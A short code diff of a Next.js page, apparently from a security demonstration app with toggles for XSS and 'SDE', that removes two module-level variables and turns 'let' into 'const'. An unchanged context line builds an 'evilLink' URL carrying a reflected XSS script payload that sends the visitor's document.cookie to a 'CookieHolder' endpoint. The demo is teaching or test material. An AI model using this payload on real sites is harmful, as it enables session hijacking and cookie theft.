@@ -2,9 +2,6 @@ import Link from "next/link";
 import { redirect } from 'next/navigation';
 import { cookies, headers } from "next/headers";
 
-let XSSEnabled = "disabled";
-let SDEEnabled = "disabled";
-
 export default async function Home({
   searchParams,
 }: {
@@ -13,8 +10,8 @@ export default async function Home({
     const coolText = (await searchParams).coolText
     const hostname = (await headers()).get("host")
     const evilLink = `http://${hostname}/?coolText=<script>document.location='http://${hostname}/CookieHolder?'%2Bdocument.cookie</script>`;
-    let XSSEnabled = (await cookies()).get("XSSEnabled")?.value
-    let SDEEnabled = (await cookies()).get("SDEEnabled")?.value
+    const XSSEnabled = (await cookies()).get("XSSEnabled")?.value
+    const SDEEnabled = (await cookies()).get("SDEEnabled")?.value
     const myCookie = (await cookies()).get("cookie")?.value
 
     async function handleFormAction(formData: FormData) {
